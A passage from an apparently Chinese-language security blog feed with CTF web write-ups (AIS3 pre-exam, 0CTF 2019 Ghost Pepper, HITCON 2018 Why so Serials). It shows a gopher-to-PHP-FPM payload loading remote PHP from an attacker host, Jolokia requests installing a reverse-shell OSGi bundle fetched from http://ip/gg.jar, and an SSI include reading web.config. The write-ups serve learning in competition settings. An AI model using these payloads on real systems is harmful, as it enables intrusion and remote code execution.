+&lt;img src="https://cyku.tw/images/2019/07/10106_01.png" alt="10106_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;可以嘗試用 &lt;code&gt;dict://&lt;/code&gt; 協定探測本機上其他 port 的服務，同時也能發現支援 &lt;code&gt;gopher://&lt;/code&gt; 協定可以發出任意 TCP 封包內容。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_02.png" alt="10106_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;經過一些黑箱觀察，發現本機的 9000 port 是開啟的狀態，而這個 port 是 PHP-FPM 的預設 port，大概可以猜測是用 &lt;code&gt;gopher://&lt;/code&gt; 偽造 TCP 封包發給 PHP-FPM 執行。PHP-FPM 吃的是 FastCGI 的 protocol，一般我們可以側錄自己本機的封包再來透過 gopher 重送到目標上，但在這道題目中如果網址輸入超過 236 個字元會出現錯誤訊息：「Your url is too looooong! (max length: 236)」，一般側錄下來的都會超過這個字元數，勢必要客製化 payload 來縮短長度，雖然我們可以手動構造，但是封包結構要很精確，只要一個 byte 算錯就會失敗，對於手殘的我選擇借用這個 GitHub Repository: &lt;a href="https://github.com/piaca/fcgi_exp"target="_blank" rel="noopener"&gt;piaca/fcgi_exp&lt;/a&gt; 上的 fcgiclient 來完成構造 payload 的任務。&lt;/p&gt;
+&lt;p&gt;縮減 fcgiclient 的參數，最後只剩下：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;env[&amp;#34;PHP_VALUE&amp;#34;] = &amp;#34;allow_url_include=On\nauto_prepend_file=http://ip/a&amp;#34;
+env[&amp;#34;REQUEST_METHOD&amp;#34;] = &amp;#34;GET&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;主要是將 allow_url_include 重新設置為 on，再透過 &lt;code&gt;auto_prepend_file=http://ip/a&lt;/code&gt; 去載入遠端的 PHP 程式碼執行。&lt;/p&gt;
+&lt;p&gt;在本地 nc 一個 port 來接收 FastCGI 的封包，再讓 fcgiclient 往這個 port 上送。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_03.png" alt="10106_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;我在自己的伺服器上準備了一個 PHP 程式碼的檔案，內容是呼叫系統指令用 perl 執行一段 Reverse Shell 回到我自己的主機。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_04.png" alt="10106_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;用 &lt;code&gt;gopher://&lt;/code&gt; 重新包裝 FastCGI 封包內容送過去，記得要多送幾次讓配置生效才能順利執行。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_05.png" alt="10106_05" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;沒意外就會順利拿到 Reverse Shell，接著看看根目錄的檔案列表，發現 &lt;code&gt;/flag&lt;/code&gt; 的檔案，可是設定成只有 root 可以讀取。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_06.png" alt="10106_06" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;同時發現有個 setuid 的 binary 叫 &lt;code&gt;/readflag&lt;/code&gt; 並且有給原始碼 &lt;code&gt;/readflag.c&lt;/code&gt;，本以為可以直接執行那個 binary 拿 flag，結果居然還要輸入一個加法算式的答案，而且顯示後讓你輸入的時間極為短暫，幾乎不可能心算完手動輸入 XD&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_07.png" alt="10106_07" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;個人學藝不精，只知道最簡單暴力的方式，用 PHP 寫了一個程式讀取 &lt;code&gt;/readflag&lt;/code&gt; 輸出然後計算答案再輸入給它。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_08.png" alt="10106_08" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;執行後終於能獲得 flag。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/07/10106_09.png" alt="10106_09" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;以上就是今年 pre-exam 的所有 web 題目了。&lt;br&gt;
+雖然我既不是學員也不是工人，但還是祝大家都能在今年的 AIS3 玩得愉快 XDD&lt;/p&gt;</description></item><item><title>0CTF/TCTF 2019 Quals: Ghost Pepper Write-up</title><link>https://cyku.tw/blog/ctf-0ctf-tctf-2019-quals/</link><pubDate>Mon, 25 Mar 2019 16:38:56 +0800</pubDate><guid>https://cyku.tw/blog/ctf-0ctf-tctf-2019-quals/</guid><description>
+&lt;p&gt;太久沒寫文章，快速記錄一次簡單的 Web 題目。&lt;/p&gt;
+&lt;p&gt;題目敘述如下：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Do you know ghost pepper? Let&amp;#39;s eat. http://111.186.63.207:31337&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;點開網頁出現授權要求視窗，網站訊息提示:「karaf」，直覺猜預設帳密 karaf/karaf，即可成功通過授權驗證。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_01.png" alt="0ctf_2019_quals_ghost_pepper_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;但是進去後，頁面顯示 HTTP 404，快速猜測一些常見路徑都無果。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_02.png" alt="0ctf_2019_quals_ghost_pepper_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;回想起題目敘述提到「ghost pepper」，丟到 Google 搜尋，第一筆結果為維基百科「Bhut jolokia - Wikipedia」，Bhut Jolokia 是一種稱為印度鬼椒的辣椒。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_03.png" alt="0ctf_2019_quals_ghost_pepper_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;於是嘗試輸入網址 &lt;code&gt;http://111.186.63.207:31337/jolokia&lt;/code&gt;，出現了一串 JSON 資料。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_04.png" alt="0ctf_2019_quals_ghost_pepper_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;看來是個 Jolokia 的服務，關於 Jolokia 的介紹可以參考官方文件或是可以在網路上找到一些中文翻譯資料。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://jolokia.org/reference/html/index.html"target="_blank" rel="noopener"&gt;Jolokia - Reference Documentation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://huazx.github.io/Jolokia/reference/"target="_blank" rel="noopener"&gt;Jolokia - 参考手册&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.jianshu.com/p/bfc5a8e73ca9"target="_blank" rel="noopener"&gt;Jolokia 教程 - part1（翻译）&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;對於 Jolokia 曾經有些 CVE 可以直接 RCE，但這題目的版本已經修復了。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html"target="_blank" rel="noopener"&gt;Remote Code Execution via JNDI injection&lt;br&gt;
+CVE-2018-1000130&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.anquanke.com/post/id/103016"target="_blank" rel="noopener"&gt;Exploiting Jolokia Agent with Java EE Servers&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以需要尋找新方向，可以先使用 &lt;code&gt;http://111.186.63.207:31337/jolokia/list&lt;/code&gt; 列出能操作的 MBean，也許會找到些有趣的 Operation。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_05.png" alt="0ctf_2019_quals_ghost_pepper_05" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;其中有個 MBean &lt;code&gt;org.apache.karaf:name=root,type=bundle&lt;/code&gt; 下的 Operation &lt;code&gt;install&lt;/code&gt; 吸引到了我的注意，似乎可以讓我安裝一個 OSGi Bundle (jar file)。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_07.png" alt="0ctf_2019_quals_ghost_pepper_07" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;關於 OSGi、karaf、bundle 可參考：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.sdnlab.com/community/question/62"target="_blank" rel="noopener"&gt;那位仁兄能解释一下什么是OSGi，还有Karaf | SDNLAB知识社区&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/OSGi"target="_blank" rel="noopener"&gt;OSGi - Wikipedia&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;首先嘗試是否支援 HTTP 協定到遠端伺服器抓取 Bundle (jar) 檔案。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;POST /jolokia HTTP/1.1
+Host: 111.186.63.207:31337
+Connection: close
+Content-Type: application/json
+Content-Length: 181
+Authorization: Basic a2FyYWY6a2FyYWY=
+{
+&amp;#34;type&amp;#34; : &amp;#34;exec&amp;#34;,
+&amp;#34;mbean&amp;#34; : &amp;#34;org.apache.karaf:name=root,type=bundle&amp;#34;,
+&amp;#34;operation&amp;#34;: &amp;#34;install(java.lang.String)&amp;#34;,
+&amp;#34;arguments&amp;#34;: [&amp;#34;http://ip/gg.jar&amp;#34;]
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_08.png" alt="0ctf_2019_quals_ghost_pepper_08" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;成功收到一個 HTTP 請求，確實支援且看來沒有對外連線的限制。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_09.png" alt="0ctf_2019_quals_ghost_pepper_09" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;接著就可以開始撰寫惡意的 bundle (jar) 檔，我參考了此篇文章 &lt;a href="https://www.javaworld.com/article/2077837/java-se-hello-osgi-part-1-bundles-for-beginners.html?page=2"target="_blank" rel="noopener"&gt;Hello, OSGi, Part 1: Bundles for beginners&lt;/a&gt;，用 Eclipse 快速建立了一個 OSGi Bundle example，接著在 Activator.java 中的 &lt;code&gt;void start(BundleContext context)&lt;/code&gt; 寫入一個 Reverse Shell 的程式碼，這個函式將會在 Bundle 被 start 時呼叫。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_10.png" alt="0ctf_2019_quals_ghost_pepper_10" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;Reverse Shell 參考：&lt;br&gt;
+&lt;a href="https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0"target="_blank" rel="noopener"&gt;GitHubGist - caseydunham/C.java&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;將撰寫好的 Bundle 匯出成單獨的 jar 檔，再次呼叫 &lt;code&gt;org.apache.karaf:name=root,type=bundle&lt;/code&gt; 的 &lt;code&gt;install&lt;/code&gt; 進行安裝，可以看到下圖中，目標伺服器成功來抓取到 jar 檔案，接著回覆了安裝好的 Bundle 的 id 為 94。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_11.png" alt="0ctf_2019_quals_ghost_pepper_11" data-zoomable loading="lazy" /&gt;&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_12.png" alt="0ctf_2019_quals_ghost_pepper_12" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;最後只要呼叫 &lt;code&gt;org.apache.karaf:name=root,type=bundle&lt;/code&gt; 的 &lt;code&gt;start&lt;/code&gt; 啟動該 Bundle，就能順利收到 Reverse Shell。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;POST /jolokia HTTP/1.1
+Host: 111.186.63.207:31337
+Connection: close
+Content-Type: application/json
+Content-Length: 135
+Authorization: Basic a2FyYWY6a2FyYWY=
+{
+&amp;#34;type&amp;#34; : &amp;#34;exec&amp;#34;,
+&amp;#34;mbean&amp;#34; : &amp;#34;org.apache.karaf:name=root,type=bundle&amp;#34;,
+&amp;#34;operation&amp;#34;: &amp;#34;start&amp;#34;,
+&amp;#34;arguments&amp;#34;: [&amp;#34;94&amp;#34;]
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_13.png" alt="0ctf_2019_quals_ghost_pepper_13" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;最終得到 flag 是 &lt;strong&gt;flag{DOYOULOVEJOLOKIA?ILOVEITVERYMUCH}&lt;/strong&gt;&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2019/03/0ctf_2019_quals_ghost_pepper_14.png" alt="0ctf_2019_quals_ghost_pepper_14" data-zoomable loading="lazy" /&gt;&lt;/p&gt;</description></item><item><title>HITCON 2018: Why so Serials? Write-up</title><link>https://cyku.tw/blog/ctf-hitcon-2018-why-so-serials/</link><pubDate>Fri, 26 Oct 2018 00:04:11 +0800</pubDate><guid>https://cyku.tw/blog/ctf-hitcon-2018-why-so-serials/</guid><description>
+&lt;p&gt;Why so Serials? 是由 Orange 在前陣子剛結束的 HITCON CTF 2018 出的一道 Web 題目，題目架設在 Windows/IIS，其功能只有一個頁面 Default.aspx，題目有提供原始碼，現在可以在 &lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/why-so-serials/src/Default.aspx"target="_blank" rel="noopener"&gt;Orange 的 GitHub&lt;/a&gt; 上找到。&lt;/p&gt;
+&lt;p&gt;該頁面有提供一個上傳功能，但幾乎阻擋了所有可能直接 RCE 的副檔名。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;String[] blacklists = {&amp;#34;.aspx&amp;#34;, &amp;#34;.config&amp;#34;, &amp;#34;.ashx&amp;#34;, &amp;#34;.asmx&amp;#34;, &amp;#34;.aspq&amp;#34;, &amp;#34;.axd&amp;#34;, &amp;#34;.cshtm&amp;#34;, &amp;#34;.cshtml&amp;#34;, &amp;#34;.rem&amp;#34;, &amp;#34;.soap&amp;#34;, &amp;#34;.vbhtm&amp;#34;, &amp;#34;.vbhtml&amp;#34;, &amp;#34;.asa&amp;#34;, &amp;#34;.asp&amp;#34;, &amp;#34;.cer&amp;#34;};
+if (blacklists.Any(extension.Contains)) {
+Label1.Text = &amp;#34;What do you do?&amp;#34;;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;首先來觀察一下上傳檔案發出的 Request，可以發現有啟用 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 並且沒有加密。當 Request/Response 中的 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 是未加密時，Burp Suite 會嘗試 parse 它並把資訊顯示在一個標籤頁之中。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/10/hitcon_ctf_2018_why_so_serials_01.png" alt="hitcon_ctf_2018_why_so_serials_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;若有不知道 View State 的朋友可以參考微軟官網的介紹：&lt;a href="https://msdn.microsoft.com/en-us/library/ms972976.aspx"target="_blank" rel="noopener"&gt;Understanding ASP.NET View State&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;一件有趣的事實是 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 所儲存的是 Serialized Data，再加上題目有 &lt;code&gt;Serials&lt;/code&gt; 關鍵字，大致可以確定是打 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 的 Deserialization。針對 ASP.NET 的 Deserialization，國外大神 pwntester 開發了一個很棒的開源專案 &lt;a href="https://github.com/pwntester/ysoserial.net"target="_blank" rel="noopener"&gt;ysoserial.net&lt;/a&gt;，可以自動產出很多漂亮的 Gadget，目標當然就是 RCE。&lt;/p&gt;
+&lt;p&gt;先嘗試修改 &lt;code&gt;__VIEWSTAET&lt;/code&gt; 的值確認是否能任意竄改，我嘗試一個簡單的文字 &lt;a href="https://github.com/agix/NetBinaryFormatterParser/blob/master/examples/SimpleViewState.b64"target="_blank" rel="noopener"&gt;Payload&lt;/a&gt;&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/10/hitcon_ctf_2018_why_so_serials_02.png" alt="hitcon_ctf_2018_why_so_serials_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;理所當然是失敗了，畢竟是 Orange 所出的題目，不可能如此單純。但讓我們仔細看一下錯誤訊息：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that &amp;lt;machineKey&amp;gt; configuration specifies the same validationKey and validation algorithm. AutoGenerate cannot be used in a cluster.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;會出現這段錯誤訊息的原因是 ASP.NET 在 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 有作 MAC (Message Authentication Code) 的檢查，合法才會進行 Deserialize，我們都知道 MAC 的檢查一定是和某個藏在伺服器端的 Key 有所關連。在 ASP.NET 的環境下，儲存這把 Key 的項目稱為 &lt;a href="https://docs.microsoft.com/zh-tw/previous-versions/dotnet/netframework-4.0/w8h3skw9%28v%3dvs.100%29"target="_blank" rel="noopener"&gt;Machine Key&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;至於這 Machine Key 該如何獲得呢？題目設計了一個關鍵，前面上傳檔案時檢查的副檔名列表遺漏了一個格式是 &lt;code&gt;.shtml&lt;/code&gt;，這個格式支援了一個稱作 &lt;a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%86%85%E5%B5%8C"target="_blank" rel="noopener"&gt;Server Side Include&lt;/a&gt; 的 feature，透過這個 feature 讓我們可以進行任意讀檔甚至有直接 RCE 的可能，這也是題目預期的解法。&lt;/p&gt;
+&lt;p&gt;保險起見，讓我們先嘗試直接 RCE 的 Payload，果不其然失敗，&lt;code&gt;exec&lt;/code&gt; 沒有啟用。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;payload.shtml
+&amp;lt;!--#exec cmd=&amp;#34;whoami&amp;#34; --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2018/10/hitcon_ctf_2018_why_so_serials_03.png" alt="hitcon_ctf_2018_why_so_serials_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;接著嘗試讀取 web.config。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;payload.shtml:
+&amp;lt;!--#include file=&amp;#34;..\..\web.config&amp;#34; --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;真棒！是我們朝思暮想的 Machine Key。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/10/hitcon_ctf_2018_why_so_serials_04.png" alt="hitcon_ctf_2018_why_so_serials_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&amp;lt;configuration&amp;gt;
+&amp;lt;system.web&amp;gt;
+&amp;lt;customErrors mode=&amp;#34;Off&amp;#34;/&amp;gt;
+&amp;lt;machineKey validationKey=&amp;#34;b07b0f97365416288cf0247cffdf135d25f6be87&amp;#34; decryptionKey=&amp;#34;6f5f8bd0152af0168417716c0ccb8320e93d0133e9d06a0bb91bf87ee9d69dc3&amp;#34; decryption=&amp;#34;DES&amp;#34; validation=&amp;#34;MD5&amp;#34; /&amp;gt;
+&amp;lt;/system.web&amp;gt;
